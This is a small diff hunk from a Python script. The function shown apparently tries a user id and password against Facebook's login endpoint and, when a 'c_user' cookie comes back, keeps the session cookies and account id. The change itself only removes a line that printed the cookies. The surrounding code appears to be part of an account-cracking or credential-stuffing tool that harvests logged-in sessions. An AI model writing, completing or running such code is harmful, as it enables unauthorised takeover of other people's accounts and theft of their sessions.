@@ -1390,7 +1390,6 @@ def p(uid,pwx,tl):
             url = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzMyNjQ1ODA2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
             po = Session.post(url, cookies=cookies, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
-            print(cookies)
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
